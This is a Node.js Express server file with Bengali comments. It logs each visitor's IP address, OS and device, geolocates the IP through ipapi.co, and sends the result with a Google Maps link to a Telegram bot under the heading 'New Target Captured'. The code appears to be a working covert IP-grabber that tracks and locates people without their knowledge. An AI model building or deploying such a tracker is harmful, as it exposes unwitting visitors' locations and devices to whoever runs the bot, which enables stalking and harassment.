const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.post('/api/visitor-log', async (req, res) => {
    const { os, device } = req.body;
    
    // ভিজিটরের আসল আইপি অ্যাড্রেস নেওয়া
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (ip === '::1' || ip === '127.0.0.1') {
        ip = '8.8.8.8'; // লোকালহোস্টে টেস্ট করার জন্য গুগল ডিএনএস আইপি (লাইভে গেলে এটা অটো ইউজারের আইপি হবে)
    }

    try {
        // আইপি দিয়ে লোকেশন ট্র্যাক করা
        const ipRes = await fetch(`https://ipapi.co/${ip}/json/`);
        const ipData = await ipRes.json();

        const city = ipData.city || "Unknown City";
        const country = ipData.country_name || "Unknown Country";
        const latitude = ipData.latitude;
        const longitude = ipData.longitude;
        
        // গুগল ম্যাপের ইউআরএল তৈরি
        const mapUrl = (latitude && longitude) 
            ? `https://www.google.com/maps?q=${latitude},${longitude}` 
            : "Unavailable";

        // টেলিগ্রাম মেসেজ ফরম্যাট
        const message = `🚨 *New Target Captured* 🚨\n\n` +
                        `🌐 *IP Address:* ${ip}\n` +
                        `💻 *OS:* ${os}\n` +
                        `📱 *Device:* ${device}\n` +
                        `📍 *Location:* ${city}, ${country}\n` +
                        `🗺️ *Google Map:* [Click Here to View](${mapUrl})`;

        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        res.status(200).json({ status: 'success' });
    } catch (error) {
        console.error("Error logging telemetry:", error);
        res.status(500).json({ status: 'error' });
    }
});

app.listen(3000, () => console.log('Server runs on port 3000'));